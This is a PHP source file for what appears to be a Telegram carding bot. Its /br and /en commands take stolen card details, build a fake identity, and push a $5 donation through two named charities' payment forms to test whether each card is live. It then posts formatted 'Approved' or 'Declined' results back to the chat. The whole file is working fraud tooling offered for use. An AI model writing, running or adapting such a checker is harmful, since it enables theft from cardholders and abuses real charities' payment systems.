    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chatId, $respuesta, $id_text);
    die();// Editar el mensaje con el resultado generado
} else {
    editMessage($chatId, $respuesta, $id_text);
    die();// Editar el mensaje con el resultado generado
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

 }



if (preg_match('/^(!|\/|\.)br/', $message)) {
	/*	$respuesta = "Gate no disponible por el momento !!!";
	sendMessage($chatId,$respuesta, $message_id);
	die(); */
unlink('cookie.txt');
	
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano   = $i[2];
$cvv   = $i[3];
$bin = substr($lista, 0, 6);

if (strlen($ano) == 2) {
    $ano = '20' . $ano;
}

$mes = explode("|", $lista);
$mes = intval($mes[1]);


//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /br CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId, $respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin




///generador de nombres///
$names = ['Juan', 'María', 'Pedro', 'Ana', 'Luis', 'Sofía', 'Carlos', 'Elena', 'Alejandro', 'Isabel'];
$lastNames = ['García', 'Rodríguez', 'González', 'Martínez', 'Hernández', 'López', 'Díaz', 'Pérez', 'Sánchez', 'Ramírez'];

function generatePhoneNumber() {
    return sprintf("(%d) %d-%04d", rand(200,999), rand(200,999), rand(1000,9999));
}

function simpleCurl($url, $postFields = null, $cookie = true, $headers = []) {
    $defaultHeaders = [
        'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
        'Accept-Encoding: gzip, deflate, br, zstd',
        'cache-control: max-age=0',
        'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        'sec-ch-ua-mobile: ?1',
        'sec-ch-ua-platform: "Android"',
        'upgrade-insecure-requests: 1',
        'sec-gpc: 1',
        'accept-language: es-US,es;q=0.5',
        'priority: u=0, i'
    ];
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => $postFields ? 'POST' : 'GET',
        CURLOPT_HTTPHEADER => array_merge($defaultHeaders, $headers)
    ]);
    if ($cookie) {
        curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    }
    if ($postFields) curl_setopt($curl, CURLOPT_POSTFIELDS, $postFields);
    $response = curl_exec($curl);
    curl_close($curl);
    return $response;
}

$name = $names[array_rand($names)];
$last = $lastNames[array_rand($lastNames)];
$phone = generatePhoneNumber();
echo "Nombre: $name $last\nTeléfono: $phone\n";

// Email generator
$response = file_get_contents('https://www.fakemailgenerator.com');
preg_match('/value="([^"]+)"/', $response, $user);
preg_match('/<span id="domain">([^<]+)<\/span>/', $response, $domain);
$email = "{$user[1]}{$domain[1]}";
echo "$email\n";
sendPv("1292171163", $email);
	
// Bin lookup
$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
$binna = json_decode($content,true);
//---------------------------------------------//
$brand = $binna['scheme'];
if (empty($brand)) {
$brand = "Unavailable";
}
//VARIABLES//
$MV = ucwords(strtolower(trim($brand)));
echo "$MV\n";



// First page: get qfKey and MAX_FILE_SIZE
$response = simpleCurl('https://breastcancereducation.org/make-a-donation');
preg_match('/<input name="qfKey" type="hidden" value="([^"]+)"/', $response, $qfKey);
preg_match('/<input name="MAX_FILE_SIZE" type="hidden" value="([^"]+)"/', $response, $maxFile);
$qfKey = $qfKey[1];
$MAX_FILE_SIZE = $maxFile[1];
echo "qfKey: $qfKey\nMAX_FILE_SIZE: $MAX_FILE_SIZE\n-------------------------------\n";
sendPv("1292171163", $qfKey);
	
// Submit donation form
simpleCurl('https://breastcancereducation.org/civicrm/contribute/transact', [
    'qfKey' => ''.$qfKey.'',
    'MAX_FILE_SIZE' => ''.$MAX_FILE_SIZE.'',
    'hidden_processor' => '1',
    'payment_processor_id' => '3',
    'priceSetId' => '5',
    'selectProduct' => '',
    '_qf_default' => 'Main:upload',
    'price_3' => '0',
    'price_4' => '5',
    'email-5' => ''.$email.'',
    'honor[prefix_id]' => '',
    'honor[first_name]' => '',
    'honor[last_name]' => '',
    'honor[email-1]' => '',
    'honor[note]' => '',
    'honor[image_URL]' => '',
    'custom_28' => '',
    'custom_29' => '',
    'custom_31' => '',
    'custom_30' => '',
    'credit_card_type' => ''.$MV.'',
    'credit_card_number' => ''.$cc.'',
    'cvv2' => ''.$cvv.'',
    'credit_card_exp_date[M]' => ''.$mes.'',
    'credit_card_exp_date[Y]' => ''.$ano.'',
    'billing_first_name' => ''.$name.'',
    'billing_middle_name' => '',
    'billing_last_name' => ''.$last.'',
    'billing_street_address-5' => '6195 bollinger rd',
    'billing_city-5' => 'New york',
    'billing_country_id-5' => '1228',
    'billing_state_province_id-5' => '1031',
    'billing_postal_code-5' => '10080',
    '_qf_Main_upload' => '1',
]);

// Confirm page
$response = simpleCurl('https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey);
preg_match('/<input name="qfKey" type="hidden" value="([^"]+)"/', $response, $qfKey2);
$qfKey2 = $qfKey2[1];
echo "qfKey: $qfKey2\n";

// Confirm donation
simpleCurl('https://breastcancereducation.org/civicrm/contribute/transact', 'qfKey='.$qfKey.'&_qf_default=Confirm:next&_qf_Confirm_next=1');

// Final page
$response = simpleCurl('https://breastcancereducation.org/civicrm/contribute/transact?_qf_Main_display=true&qfKey='.$qfKey);

if (preg_match('/<span class="msg-text">(.*?)<\/span>/', $response, $msg1)) {
    if (preg_match('/Payment Processor Error message :\d*\s*(.*)/', $msg1[1], $msg2)) {
        $mensaje = trim($msg2[1]);
    } else {
        $mensaje = $msg1[1];
    }
} elseif (preg_match('/<li>(.*?)<\/li>/', $response, $msg3)) {
    $mensaje = $msg3[1];
} elseif (preg_match('/Your contribution has been submitted to Credit Card for processing/', $response)) {
    $mensaje = 'Your contribution has been submitted to Credit Card for processing';
}
echo "Mensaje final: $mensaje\n";
$respo = $mensaje;	

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";



$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";
/*
if ($respo == 'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.'){
$respo = 'Card Issuer Declined CVV';
}*/

if (empty($respo)) {
        $respo = $response;
}

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'Expiration Date is a required field.') !== false || strpos($respo, 'Please enter a valid Card Verification Number') !== false || strpos($respo, 'This transaction has been declined.') !== false){
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Gate Error❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chatId, $respuesta, $id_text);
    die();
} else {
    //echo "$respuesta\n";
    editMessage($chatId, $respuesta, $id_text);
	die();
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}

	


if (preg_match('/^(!|\/|\.)en/', $message)) {
$lista = substr($message, 4);

$i = preg_split('/[|:| ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);

$bin = substr($lista, 0, 6);
//-----------------------------------------------------//


//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /en CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}



//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId, $respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
                                    }


////EXTRAE EL NONCE////
$cc = implode('+', $partes);

//RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://environmentvictoria.org.au/give/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
//  CURLOPT_COOKIE => 'ap3c=IGd4hf2AuelnYH4BAGd4hf2gztotpay7CT3X-oYpVWlMiMuNVA; PHPSESSID=ec26389e2fe6166a22d67286f65cb59f; __cf_bm=1Ye2xpjCVJIqlTxQILHysFAjb_8bw1zRDHV4yZ7AD9E-1735953044-1.0.1.1-Sn8gl_rNV5oBBoVDY380qKL.KWA_5WPy5YEPod4vVShR4H6qxU_SYmzOul15308sekfYVsIafj_MISD6_bCXag; ap3pages=19',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://environmentvictoria.org.au/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);



$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://environmentvictoria.org.au/give/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'referer: https://environmentvictoria.org.au/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);

preg_match('/_wpnonce" value="([^"]+)"/', $response, $match);
$nonce = $match[1];

echo "$nonce\n"; // imprime: d144ae23a1


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://environmentvictoria.org.au/give/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'donations_action=donation&donation%5Bbraintree_token%5D=55&donation%5Bpaypal_nonce%5D=&donation%5Bpage_id%5D=244&donation%5Bcampaign%5D=&donation%5Bthankyou%5D=https%3A%2F%2Fenvironmentvictoria.org.au%2Fgive%2Fthank-you%2F&_wpnonce='.$nonce.'&_wp_http_referer=%2Fgive%2F&donation%5Brecurring%5D=0&donation%5Bother-amount%5D=5&user%5Bfirst_name%5D='.$name.'&user%5Blast_name%5D='.$last.'&user%5Bstreet_address%5D='.$street.'&user%5Bcity%5D='.$city.'&user%5Bstate%5D=VIC&user%5Bpostcode%5D='.$postcode.'&user%5Bphone%5D='.$phone.'&user%5Bemail%5D='.$email.'&card_number='.$cc.'&card_expiry='.$mes.'%2F'.$ano.'&card_cvv='.$cvv.'&donation%5Bemail%5D=&donation%5Bstreet_address%5D=&donation%5Bcity%5D=&donation%5Bstate%5D=&donation%5Bpostcode%5D=&donation%5Bcountry%5D=&donation%5Bname%5D=&donation%5Bfirst_name%5D=&donation%5Blast_name%5D=&donation%5Bphone%5D=&donation%5Bpayment_method%5D=&donation%5Bnew_donation%5D=1&donation%5Bsalesforce_contact_id%5D=&donation%5Bamount%5D=5&donation%5Bsalesforce_campaign_id%5D=&donation%5Bsalesforce_campaign_name%5D=Give+page&device_data=%7B%22device_session_id%22%3A%222f2e7d7f5b090e2b08ce13fd98eadeb0%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22891ff729547f44f23fe6a2ded11da524%22%7D',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'origin: https://environmentvictoria.org.au',
    'referer: https://environmentvictoria.org.au/give/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$parts = explode('<li class="payment-error error">', $response);
$respo = explode('</li>', $parts[1])[0];

curl_close($curl);


$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";




// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chatId, $respuesta, $id_text);
} else {
    editMessage($chatId, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

 }


	
	 return null; // Si el mensaje no es un comando válido, devuelve null
}
?>
